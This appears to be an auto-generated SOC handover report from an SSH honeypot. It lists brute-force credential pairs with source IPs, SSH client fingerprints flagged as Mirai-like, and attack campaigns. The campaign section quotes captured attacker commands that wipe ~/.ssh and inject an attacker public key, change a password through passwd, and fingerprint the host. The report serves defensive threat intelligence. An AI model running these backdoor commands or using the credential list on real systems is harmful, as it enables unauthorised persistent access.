# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-07-22 |
| **Generated At** | 2026-07-22T10:30:49Z |
| **Shift Time** | 10:30 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · Oracle Cloud HA · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **424** |
| Confirmed Threats | **392** |
| False Positives Filtered | **32** (7.5%) |
| Unique Attacker IPs | **175** |
| Countries of Origin | **36** |
| High Severity Cases | **247** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **177** |
| Malware Samples Analyzed | **2** HIGH · **31** MED · 12 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **315** |
| Unique Credential Pairs | **184** |
| Unique Usernames | **79** |
| Unique Passwords | **135** |
| Successful Auth Pairs | **287** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 50 |
| `guest` | 24 |
| `admin` | 23 |
| `support` | 20 |
| `345gs5662d34` | 17 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `345gs5662d34` | 17 |
| `3245gs5662d34` | 17 |
| `123456` | 10 |
| `987654321` | 9 |
| `support` | 8 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `345gs5662d34` | `345gs5662d34` | 17 |
| `support` | `support` | 8 |
| `support` | `support22` | 6 |
| `guest` | `00000` | 6 |
| `admin` | `admin2025` | 6 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `geth` | `geth` | `45.148.10.183` | 2026-07-22T04:55:46 |
| `docker` | `docker` | `92.118.39.71` | 2026-07-22T04:56:42 |
| `nethermind` | `nethermind` | `45.148.10.183` | 2026-07-22T04:57:51 |
| `ec2-user` | `123456` | `92.118.39.71` | 2026-07-22T04:58:47 |
| `besu` | `besu` | `45.148.10.183` | 2026-07-22T05:00:06 |
| `ec2-user` | `12345678` | `92.118.39.71` | 2026-07-22T05:00:42 |
| `erigon` | `erigon` | `45.148.10.183` | 2026-07-22T05:02:11 |
| `ec2-user` | `password` | `92.118.39.71` | 2026-07-22T05:02:37 |
| `pi` | `Passw@rd` | `182.151.45.136` | 2026-07-22T05:04:22 |
| `ftp` | `123` | `92.118.39.71` | 2026-07-22T05:04:28 |
| `pi` | `Passw@rd` | `24.142.170.231` | 2026-07-22T05:04:30 |
| `pi` | `Passw@rd` | `10.0.0.73` | 2026-07-22T05:04:46 |
| `guest` | `77777` | `182.225.134.13` | 2026-07-22T05:05:04 |
| `guest` | `77777` | `46.201.247.21` | 2026-07-22T05:05:11 |
| `guest` | `77777` | `10.0.0.73` | 2026-07-22T05:05:28 |
| `ftp` | `123456` | `92.118.39.71` | 2026-07-22T05:06:15 |
| `silkworm` | `silkworm` | `45.148.10.183` | 2026-07-22T05:06:39 |
| `git` | `123` | `92.118.39.71` | 2026-07-22T05:08:05 |
| `ethereumjs` | `ethereumjs` | `45.148.10.183` | 2026-07-22T05:08:54 |
| `git` | `123123` | `92.118.39.71` | 2026-07-22T05:09:59 |
| `prysm` | `prysm` | `45.148.10.183` | 2026-07-22T05:11:08 |
| `git` | `1234` | `92.118.39.71` | 2026-07-22T05:11:53 |
| `root` | `root2002` | `170.233.29.157` | 2026-07-22T05:12:05 |
| `lighthouse` | `lighthouse` | `45.148.10.183` | 2026-07-22T05:13:16 |
| `git` | `12345` | `92.118.39.71` | 2026-07-22T05:13:47 |
| `unknown` | `66666` | `176.170.1.244` | 2026-07-22T05:14:14 |
| `unknown` | `66666` | `92.126.223.175` | 2026-07-22T05:14:20 |
| `teku` | `teku` | `45.148.10.183` | 2026-07-22T05:15:26 |
| `root` | `root2002` | `103.174.80.40` | 2026-07-22T05:15:28 |
| `root` | `root2002` | `49.124.154.163` | 2026-07-22T05:15:36 |
| `git` | `123456` | `92.118.39.71` | 2026-07-22T05:15:39 |
| `root` | `root2002` | `10.0.0.73` | 2026-07-22T05:15:47 |
| `git` | `12345678` | `92.118.39.71` | 2026-07-22T05:17:28 |
| `nimbus` | `nimbus` | `45.148.10.183` | 2026-07-22T05:17:41 |
| `git` | `123456789` | `92.118.39.71` | 2026-07-22T05:19:15 |
| `lodestar` | `lodestar` | `45.148.10.183` | 2026-07-22T05:19:54 |
| `git` | `code` | `92.118.39.71` | 2026-07-22T05:21:02 |
| `root` | `LeitboGi0ro` | `64.110.90.250` | 2026-07-22T05:21:15 |
| `root` | `123@@@` | `64.110.90.250` | 2026-07-22T05:21:15 |
| `grandine` | `grandine` | `45.148.10.183` | 2026-07-22T05:22:09 |
| `git` | `git` | `92.118.39.71` | 2026-07-22T05:22:54 |
| `rocketpool` | `rocketpool` | `45.148.10.183` | 2026-07-22T05:24:26 |
| `git` | `github` | `92.118.39.71` | 2026-07-22T05:24:46 |
| `user` | `user66` | `82.193.122.91` | 2026-07-22T05:26:26 |
| `ssv` | `ssv` | `45.148.10.183` | 2026-07-22T05:26:34 |
| `git` | `gitlab` | `92.118.39.71` | 2026-07-22T05:26:39 |
| `root` | `qwer123.0` | `202.165.15.132` | 2026-07-22T05:28:09 |
| `345gs5662d34` | `345gs5662d34` | `202.165.15.132` | 2026-07-22T05:28:14 |
| `root` | `3245gs5662d34` | `202.165.15.132` | 2026-07-22T05:28:16 |
| `git` | `passw0rd` | `92.118.39.71` | 2026-07-22T05:28:31 |
| `charon` | `charon` | `45.148.10.183` | 2026-07-22T05:28:44 |
| `ubnt` | `2` | `188.219.104.210` | 2026-07-22T05:28:50 |
| `git` | `password` | `92.118.39.71` | 2026-07-22T05:30:18 |
| `user` | `user66` | `10.0.0.73` | 2026-07-22T05:30:18 |
| `stakewise` | `stakewise` | `45.148.10.183` | 2026-07-22T05:31:13 |
| `git` | `qwerty` | `92.118.39.71` | 2026-07-22T05:32:05 |
| `root` | `qazWSXedcrfv` | `10.0.0.73` | 2026-07-22T05:32:29 |
| `stader` | `stader` | `45.148.10.183` | 2026-07-22T05:33:11 |
| `root` | `lala123` | `51.178.142.35` | 2026-07-22T05:33:38 |
| `345gs5662d34` | `345gs5662d34` | `51.178.142.35` | 2026-07-22T05:33:40 |
| `root` | `3245gs5662d34` | `51.178.142.35` | 2026-07-22T05:33:41 |
| `root` | `qazWSXedcrfv` | `185.242.3.195` | 2026-07-22T05:33:50 |
| `guest` | `1` | `92.118.39.71` | 2026-07-22T05:33:53 |
| `guest` | `3` | `191.36.152.28` | 2026-07-22T05:35:24 |
| `lido` | `lido` | `45.148.10.183` | 2026-07-22T05:35:26 |
| `guest` | `3` | `177.72.87.7` | 2026-07-22T05:35:32 |
| `centos` | `centos2011` | `103.120.116.162` | 2026-07-22T05:35:33 |
| `guest` | `123` | `92.118.39.71` | 2026-07-22T05:35:44 |
| `support` | `support` | `176.53.159.196` | 2026-07-22T05:35:56 |
| `support` | `support` | `10.0.0.73` | 2026-07-22T05:37:13 |
| `guest` | `1234` | `92.118.39.71` | 2026-07-22T05:37:35 |
| `eigenlayer` | `eigenlayer` | `45.148.10.183` | 2026-07-22T05:37:44 |
| `centos` | `centos2011` | `111.70.29.130` | 2026-07-22T05:38:35 |
| `guest` | `3` | `196.189.126.10` | 2026-07-22T05:38:57 |
| `centos` | `centos2011` | `10.0.0.73` | 2026-07-22T05:38:57 |
| `guest` | `3` | `14.54.22.11` | 2026-07-22T05:39:06 |
| `guest` | `3` | `10.0.0.73` | 2026-07-22T05:39:16 |
| `guest` | `12345` | `92.118.39.71` | 2026-07-22T05:39:30 |
| `eigenda` | `eigenda` | `45.148.10.183` | 2026-07-22T05:39:54 |
| `guest` | `123456` | `92.118.39.71` | 2026-07-22T05:41:28 |
| `root` | `Rayda@2017` | `185.242.3.195` | 2026-07-22T05:41:30 |
| `web3signer` | `web3signer` | `45.148.10.183` | 2026-07-22T05:42:05 |
| `guest` | `123456789` | `92.118.39.71` | 2026-07-22T05:43:23 |
| `ethdo` | `ethdo` | `45.148.10.183` | 2026-07-22T05:44:27 |
| `guest` | `1234567890` | `92.118.39.71` | 2026-07-22T05:45:15 |
| `vouch` | `vouch` | `45.148.10.183` | 2026-07-22T05:46:33 |
| `backup` | `backup` | `57.128.214.238` | 2026-07-22T05:46:35 |
| `345gs5662d34` | `345gs5662d34` | `57.128.214.238` | 2026-07-22T05:46:37 |
| `backup` | `3245gs5662d34` | `57.128.214.238` | 2026-07-22T05:46:38 |
| `guest` | `password` | `92.118.39.71` | 2026-07-22T05:47:09 |
| `amit` | `password` | `101.36.111.119` | 2026-07-22T05:48:31 |
| `345gs5662d34` | `345gs5662d34` | `101.36.111.119` | 2026-07-22T05:48:35 |
| `amit` | `3245gs5662d34` | `101.36.111.119` | 2026-07-22T05:48:37 |
| `dirk` | `dirk` | `45.148.10.183` | 2026-07-22T05:48:49 |
| `guest` | `qwerty` | `92.118.39.71` | 2026-07-22T05:49:02 |
| `root` | `5555` | `61.37.150.6` | 2026-07-22T05:50:09 |
| `root` | `5555` | `59.120.8.61` | 2026-07-22T05:50:19 |
| `manager` | `1234` | `92.118.39.71` | 2026-07-22T05:50:52 |
| `eth-docker` | `eth-docker` | `45.148.10.183` | 2026-07-22T05:51:09 |
| `centos` | `1` | `116.72.9.151` | 2026-07-22T05:51:10 |
| `manager` | `12345678` | `92.118.39.71` | 2026-07-22T05:52:48 |
| `sedge` | `sedge` | `45.148.10.183` | 2026-07-22T05:53:13 |
| `root` | `5555` | `120.234.232.184` | 2026-07-22T05:53:37 |
| `root` | `5555` | `116.48.150.115` | 2026-07-22T05:53:46 |
| `root` | `5555` | `10.0.0.73` | 2026-07-22T05:54:05 |
| `centos` | `1` | `178.178.222.55` | 2026-07-22T05:54:29 |
| `mysql` | `123` | `92.118.39.71` | 2026-07-22T05:54:45 |
| `centos` | `1` | `10.0.0.73` | 2026-07-22T05:54:58 |
| `stereum` | `stereum` | `45.148.10.183` | 2026-07-22T05:55:24 |
| `mysql` | `123123` | `92.118.39.71` | 2026-07-22T05:56:43 |
| `wagyu` | `wagyu` | `45.148.10.183` | 2026-07-22T05:57:39 |
| `mysql` | `1234` | `92.118.39.71` | 2026-07-22T05:58:42 |
| `siren` | `siren` | `45.148.10.183` | 2026-07-22T05:59:53 |
| `support` | `8888888` | `111.171.127.190` | 2026-07-22T06:00:13 |
| `support` | `8888888` | `24.187.213.29` | 2026-07-22T06:00:20 |
| `mysql` | `123456` | `92.118.39.71` | 2026-07-22T06:00:44 |
| `kurtosis` | `kurtosis` | `45.148.10.183` | 2026-07-22T06:02:15 |
| `supervisor` | `supervisor2012` | `10.0.0.73` | 2026-07-22T06:02:16 |
| `mysql` | `12345678` | `92.118.39.71` | 2026-07-22T06:02:42 |
| `support` | `8888888` | `10.0.0.73` | 2026-07-22T06:03:52 |
| `checkpointz` | `checkpointz` | `45.148.10.183` | 2026-07-22T06:04:24 |
| `mysql` | `mysql` | `92.118.39.71` | 2026-07-22T06:04:43 |
| `root` | `1Qwertyuiop` | `122.227.103.254` | 2026-07-22T06:06:17 |
| `root` | `3245gs5662d34` | `122.227.103.254` | 2026-07-22T06:06:30 |
| `mysql` | `password` | `92.118.39.71` | 2026-07-22T06:06:46 |
| `mysql` | `root` | `92.118.39.71` | 2026-07-22T06:08:48 |
| `nginx` | `123` | `92.118.39.71` | 2026-07-22T06:10:46 |
| `kiln` | `kiln` | `45.148.10.183` | 2026-07-22T06:10:59 |
| `vhserver` | `vhserver` | `122.227.103.254` | 2026-07-22T06:12:11 |
| `nginx` | `123456` | `92.118.39.71` | 2026-07-22T06:12:52 |
| `diva` | `diva` | `45.148.10.183` | 2026-07-22T06:13:13 |
| `nginx` | `12345678` | `92.118.39.71` | 2026-07-22T06:14:54 |
| `nodeset` | `nodeset` | `45.148.10.183` | 2026-07-22T06:15:27 |
| `blank` | `8888` | `118.26.153.102` | 2026-07-22T06:15:44 |
| `nginx` | `nginx` | `92.118.39.71` | 2026-07-22T06:16:53 |
| `nobody` | `8888` | `89.203.142.96` | 2026-07-22T06:18:28 |
| `nobody` | `8888` | `115.245.122.146` | 2026-07-22T06:18:36 |
| `operator` | `1` | `92.118.39.71` | 2026-07-22T06:18:57 |
| `admin` | `admin2020` | `114.98.63.18` | 2026-07-22T06:22:05 |
| `admin` | `admin2020` | `136.56.34.147` | 2026-07-22T06:22:12 |
| `student10` | `student10` | `122.227.103.254` | 2026-07-22T06:23:38 |
| `blank` | `22` | `218.26.205.154` | 2026-07-22T06:24:50 |
| `blank` | `22` | `125.69.76.148` | 2026-07-22T06:24:59 |
| `root` | `123@@@` | `129.153.145.135` | 2026-07-22T06:25:16 |
| `root` | `LeitboGi0ro` | `129.153.145.135` | 2026-07-22T06:25:16 |
| `admin` | `admin2020` | `10.0.0.73` | 2026-07-22T06:25:39 |
| `root` | `Rayda@2017` | `10.0.0.73` | 2026-07-22T06:26:06 |
| `root` | `Zxasqw12` | `120.52.18.141` | 2026-07-22T06:28:23 |
| `345gs5662d34` | `345gs5662d34` | `120.52.18.141` | 2026-07-22T06:28:37 |
| `blank` | `22` | `10.0.0.73` | 2026-07-22T06:28:40 |
| `victor` | `victor2025` | `203.88.121.4` | 2026-07-22T06:33:40 |
| `345gs5662d34` | `345gs5662d34` | `203.88.121.4` | 2026-07-22T06:33:42 |
| `victor` | `3245gs5662d34` | `203.88.121.4` | 2026-07-22T06:33:43 |
| `root` | `qwertz12345` | `185.242.3.195` | 2026-07-22T06:34:56 |
| `test` | `99` | `90.230.168.26` | 2026-07-22T06:39:36 |
| `pi` | `987654321` | `213.154.80.51` | 2026-07-22T06:40:40 |
| `pi` | `987654321` | `31.173.66.222` | 2026-07-22T06:40:51 |
| `test` | `99` | `189.52.52.162` | 2026-07-22T06:43:05 |
| `test` | `99` | `124.239.169.52` | 2026-07-22T06:43:19 |
| `pi` | `987654321` | `10.0.0.73` | 2026-07-22T06:44:17 |
| `nobody` | `nobody2004` | `179.184.218.49` | 2026-07-22T06:48:35 |
| `nobody` | `nobody2004` | `61.2.228.177` | 2026-07-22T06:48:48 |
| `nobody` | `nobody2004` | `10.0.0.73` | 2026-07-22T06:48:53 |
| `mysql` | `654321` | `62.201.228.210` | 2026-07-22T06:49:32 |
| `mysql` | `654321` | `46.201.247.21` | 2026-07-22T06:49:38 |
| `mysql` | `654321` | `10.0.0.73` | 2026-07-22T06:53:12 |
| `root` | `7ujMko0vizxv` | `175.195.238.137` | 2026-07-22T06:54:00 |
| `mg3500` | `merlin` | `175.195.238.137` | 2026-07-22T06:54:35 |
| `root` | `cat1029` | `175.195.238.137` | 2026-07-22T06:55:09 |
| `root` | `calvin` | `175.195.238.137` | 2026-07-22T06:55:44 |
| `b'\xda\xdb\xd8\xdf\xcb\xd2\xca'` | `b'\xda\xdb\xd8\xdf\xcb\xd2\xca'` | `175.195.238.137` | 2026-07-22T06:56:18 |
| `lghkel	` | `zpz}ld	` | `175.195.238.137` | 2026-07-22T06:56:19 |
| `"??$` | `>6<53$9?>` | `175.195.238.137` | 2026-07-22T06:56:53 |
| `user` | `user` | `175.195.238.137` | 2026-07-22T06:57:27 |
| `root` | `vizxv` | `175.195.238.137` | 2026-07-22T06:58:02 |
| `b'\xdf\xda\xd3\xd7\xd0'` | `b'\x8f\x8c\x8d\x8a\x8b\x88'` | `175.195.238.137` | 2026-07-22T06:58:37 |
| `root` | `qaz1234567` | `122.227.103.254` | 2026-07-22T07:00:47 |
| `pi` | `qwerty12` | `49.124.153.21` | 2026-07-22T07:04:33 |
| `pi` | `qwerty12` | `103.230.176.152` | 2026-07-22T07:08:01 |
| `pi` | `qwerty12` | `10.0.0.73` | 2026-07-22T07:08:18 |
| `supervisor` | `supervisor2020` | `200.106.49.149` | 2026-07-22T07:08:36 |
| `supervisor` | `supervisor2020` | `103.112.224.81` | 2026-07-22T07:08:44 |
| `user` | `444` | `10.0.0.73` | 2026-07-22T07:09:10 |
| `root` | `admin` | `203.150.140.229` | 2026-07-22T07:09:17 |
| `test_user1` | `123` | `115.191.38.87` | 2026-07-22T07:13:03 |
| `345gs5662d34` | `345gs5662d34` | `115.191.38.87` | 2026-07-22T07:13:09 |
| `test_user1` | `3245gs5662d34` | `115.191.38.87` | 2026-07-22T07:13:13 |
| `support` | `support22` | `181.233.140.250` | 2026-07-22T07:14:13 |
| `support` | `support22` | `182.151.45.136` | 2026-07-22T07:14:21 |
| `admin` | `Aa12345678` | `172.214.209.153` | 2026-07-22T07:14:29 |
| `345gs5662d34` | `345gs5662d34` | `172.214.209.153` | 2026-07-22T07:14:31 |
| `admin` | `3245gs5662d34` | `172.214.209.153` | 2026-07-22T07:14:31 |
| `steam` | `qw12QW!@` | `20.228.193.165` | 2026-07-22T07:16:20 |
| `345gs5662d34` | `345gs5662d34` | `20.228.193.165` | 2026-07-22T07:16:21 |
| `steam` | `3245gs5662d34` | `20.228.193.165` | 2026-07-22T07:16:21 |
| `support` | `support22` | `203.252.10.3` | 2026-07-22T07:17:36 |
| `support` | `support22` | `188.168.86.6` | 2026-07-22T07:17:44 |
| `support` | `support22` | `10.0.0.73` | 2026-07-22T07:17:59 |
| `root` | `qwertz12345` | `10.0.0.73` | 2026-07-22T07:19:50 |
| `henry` | `123456` | `185.242.3.195` | 2026-07-22T07:29:03 |
| `config` | `888888` | `61.37.150.6` | 2026-07-22T07:29:08 |
| `config` | `888888` | `202.72.196.75` | 2026-07-22T07:29:16 |
| `oracle` | `987654321` | `185.112.148.66` | 2026-07-22T07:30:02 |
| `oracle` | `987654321` | `115.241.228.34` | 2026-07-22T07:30:13 |
| `admin` | `admin` | `195.178.110.137` | 2026-07-22T07:31:06 |
| `supervisor` | `supervisor2015` | `49.206.194.29` | 2026-07-22T07:31:59 |
| `config` | `888888` | `10.0.0.73` | 2026-07-22T07:32:57 |
| `oracle` | `987654321` | `112.6.127.244` | 2026-07-22T07:33:23 |
| `oracle` | `987654321` | `49.206.201.253` | 2026-07-22T07:33:32 |
| `oracle` | `987654321` | `10.0.0.73` | 2026-07-22T07:33:41 |
| `root` | `admin2020` | `94.159.108.238` | 2026-07-22T07:39:27 |
| `345gs5662d34` | `345gs5662d34` | `94.159.108.238` | 2026-07-22T07:39:29 |
| `root` | `3245gs5662d34` | `94.159.108.238` | 2026-07-22T07:39:30 |
| `admin` | `admin` | `10.0.0.73` | 2026-07-22T07:39:45 |
| `debian` | `debian777` | `36.137.38.119` | 2026-07-22T07:42:17 |
| `debian` | `debian777` | `31.173.0.46` | 2026-07-22T07:42:29 |
| `debian` | `debian777` | `10.0.0.73` | 2026-07-22T07:42:39 |
| `unturned` | `unturned` | `103.210.91.5` | 2026-07-22T07:51:58 |
| `marcelo` | `12345678` | `152.32.182.41` | 2026-07-22T07:52:20 |
| `345gs5662d34` | `345gs5662d34` | `152.32.182.41` | 2026-07-22T07:52:22 |
| `marcelo` | `3245gs5662d34` | `152.32.182.41` | 2026-07-22T07:52:22 |
| `root` | `f` | `10.0.0.73` | 2026-07-22T07:52:47 |
| `root` | `jarod` | `10.0.0.73` | 2026-07-22T07:52:51 |
| `root` | `intruder` | `10.0.0.73` | 2026-07-22T07:53:25 |
| `root` | `images` | `10.0.0.73` | 2026-07-22T07:53:30 |
| `root` | `ignacio` | `10.0.0.73` | 2026-07-22T07:53:33 |
| `root` | `hon` | `10.0.0.73` | 2026-07-22T07:53:36 |
| `root` | `hippolyte` | `10.0.0.73` | 2026-07-22T07:53:39 |
| `root` | `hearts` | `10.0.0.73` | 2026-07-22T07:53:42 |
| `root` | `guillaum` | `10.0.0.73` | 2026-07-22T07:54:00 |
| `root` | `giorgio` | `10.0.0.73` | 2026-07-22T07:54:05 |
| `guest` | `00000` | `117.158.166.73` | 2026-07-22T07:54:07 |
| `admin` | `1qaz@WSX` | `211.106.133.202` | 2026-07-22T07:54:19 |
| `guest` | `00000` | `178.178.222.52` | 2026-07-22T07:54:21 |
| `345gs5662d34` | `345gs5662d34` | `211.106.133.202` | 2026-07-22T07:54:23 |
| `admin` | `3245gs5662d34` | `211.106.133.202` | 2026-07-22T07:54:24 |
| `postgres` | `12345` | `65.20.205.197` | 2026-07-22T07:54:42 |
| `postgres` | `12345` | `112.25.140.211` | 2026-07-22T07:54:51 |
| `admin` | `admin2025` | `113.160.209.29` | 2026-07-22T07:55:38 |
| `admin` | `admin2025` | `185.112.148.66` | 2026-07-22T07:55:47 |
| `bot` | `botpassword` | `103.131.61.136` | 2026-07-22T07:56:00 |
| `345gs5662d34` | `345gs5662d34` | `103.131.61.136` | 2026-07-22T07:56:04 |
| `bot` | `3245gs5662d34` | `103.131.61.136` | 2026-07-22T07:56:06 |
| `guest` | `00000` | `14.153.247.36` | 2026-07-22T07:57:34 |
| `guest` | `00000` | `189.56.0.19` | 2026-07-22T07:57:47 |
| `guest` | `00000` | `10.0.0.73` | 2026-07-22T07:57:58 |
| `postgres` | `12345` | `222.86.168.224` | 2026-07-22T07:58:14 |
| `postgres` | `12345` | `10.0.0.73` | 2026-07-22T07:58:36 |
| `admin` | `admin2025` | `222.252.16.237` | 2026-07-22T07:58:48 |
| `admin` | `admin2025` | `65.20.141.202` | 2026-07-22T07:58:57 |
| `admin` | `admin2025` | `10.0.0.73` | 2026-07-22T07:59:03 |
| `admin` | `root123` | `154.92.23.249` | 2026-07-22T08:06:11 |
| `345gs5662d34` | `345gs5662d34` | `154.92.23.249` | 2026-07-22T08:06:12 |
| `admin` | `3245gs5662d34` | `154.92.23.249` | 2026-07-22T08:06:12 |
| `ubuntu` | `qwerasdf` | `45.162.8.14` | 2026-07-22T08:06:16 |
| `345gs5662d34` | `345gs5662d34` | `45.162.8.14` | 2026-07-22T08:06:19 |
| `ubuntu` | `3245gs5662d34` | `45.162.8.14` | 2026-07-22T08:06:20 |
| `admin` | `222222` | `219.129.96.2` | 2026-07-22T08:07:19 |
| `admin` | `222222` | `182.156.35.238` | 2026-07-22T08:07:32 |
| `admin` | `222222` | `10.0.0.73` | 2026-07-22T08:07:36 |
| `bitnami` | `P@ssw0rd` | `49.51.231.222` | 2026-07-22T08:12:13 |
| `345gs5662d34` | `345gs5662d34` | `49.51.231.222` | 2026-07-22T08:12:19 |
| `bitnami` | `3245gs5662d34` | `49.51.231.222` | 2026-07-22T08:12:21 |
| `henry` | `123456` | `10.0.0.73` | 2026-07-22T08:14:38 |
| `test` | `testing123` | `125.16.27.190` | 2026-07-22T08:15:40 |
| `345gs5662d34` | `345gs5662d34` | `125.16.27.190` | 2026-07-22T08:15:44 |
| `test` | `3245gs5662d34` | `125.16.27.190` | 2026-07-22T08:15:45 |
| `support` | `support2020` | `14.29.204.161` | 2026-07-22T08:18:57 |
| `config` | `000` | `178.216.165.187` | 2026-07-22T08:19:31 |
| `oracle` | `1qaz2wsx` | `62.20.205.17` | 2026-07-22T08:22:10 |
| `oracle` | `1qaz2wsx` | `111.193.181.226` | 2026-07-22T08:22:21 |
| `support` | `support2020` | `10.0.0.73` | 2026-07-22T08:22:29 |
| `oracle` | `1qaz2wsx` | `10.0.0.73` | 2026-07-22T08:22:34 |
| `config` | `000` | `10.0.0.73` | 2026-07-22T08:23:08 |
| `alice` | `123456` | `185.242.3.195` | 2026-07-22T08:23:38 |
| `debian` | `22` | `82.65.140.218` | 2026-07-22T08:28:31 |
| `debian` | `22` | `14.98.28.43` | 2026-07-22T08:28:44 |
| `debian` | `22` | `124.239.129.2` | 2026-07-22T08:31:49 |
| `debian` | `22` | `2.55.122.202` | 2026-07-22T08:31:56 |
| `debian` | `22` | `10.0.0.73` | 2026-07-22T08:32:14 |
| `unknown` | `passw0rd` | `81.237.155.113` | 2026-07-22T08:42:14 |
| `unknown` | `passw0rd` | `125.19.244.62` | 2026-07-22T08:42:21 |
| `root` | `ZSiOEaqLyf` | `10.0.0.73` | 2026-07-22T08:43:27 |
| `config` | `4` | `218.21.243.58` | 2026-07-22T08:43:36 |
| `pi` | `passwd` | `59.92.51.188` | 2026-07-22T08:44:10 |
| `pi` | `passwd` | `195.158.26.59` | 2026-07-22T08:44:18 |
| `unknown` | `passw0rd` | `10.0.0.73` | 2026-07-22T08:45:54 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **424** |
| Sessions with Fingerprint | **13** |
| Unique HASSH Fingerprints | **13** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| Go SSH scanner | 99 |
| OpenSSH | 84 |
| libssh | 83 |
| Paramiko (Python) | 4 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `acaa53e0a7d7...` | Mirai/variant | 84 | 80 |
| `f555226df196...` | Mirai/variant | 67 | 21 |
| `2ec37a7cc8da...` | Mirai/variant | 44 | 1 |
| `16443846184e...` | Generic scanner | 42 | 2 |
| `a2de0f306611...` | Mirai/variant | 4 | 2 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `acaa53e0a7d7...` | OpenSSH | 84 | 80 | Mirai/variant |
| `f555226df196...` | libssh | 67 | 21 | Mirai/variant |
| `2ec37a7cc8da...` | Go SSH scanner | 44 | 1 | Mirai/variant |
| `16443846184e...` | Go SSH scanner | 42 | 2 | Generic scanner |
| `95420f9d932d...` | libssh | 15 | 3 | — |
| `a2de0f306611...` | Paramiko (Python) | 4 | 2 | Mirai/variant |
| `eff4c24daffc...` | Go SSH scanner | 4 | 1 | Modern SSH client |
| `4e066189c3bb...` | Go SSH scanner | 3 | 1 | Generic scanner |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **9** |
| Campaign Clusters | **3** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 2 | 2 | `T1021.004, T1078, T1083, T1082` |
| **Recon Loader Script** | 🟡 MEDIUM | 44 | 1 | `T1082, T1592, T1078, T1083` |
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 19 | 18 | `T1021.004, T1078, T1070, T1140` |

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
```
cat /proc/cpuinfo | grep name | wc -l
```
```
echo -e "vhserver\nnpxcqHDRMJEa\nnpxcqHDRMJEa"|passwd|bash
```
```
Enter new UNIX password:
```
Source IPs: `122.227.103.254`, `103.210.91.5`

**🟡 MEDIUM · Recon Loader Script**

> Multi-stage recon script. Exports PATH, fingerprints host, returns data to C2 loader.

Representative commands:
```
export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una
```
```
uname -s -v -n -m 2 > /dev/null
```
```
/bin/uname -s -v -n -m 2 > /dev/null
```
```
/usr/bin/uname -s -v -n -m 2 > /dev/null
```
```
busybox uname -s -v -n -m 2 > /dev/null
```
Source IPs: `92.118.39.71`

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `202.165.15.132`, `203.88.121.4`, `57.128.214.238`, `103.131.61.136`, `154.92.23.249`, `120.52.18.141`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **175** |
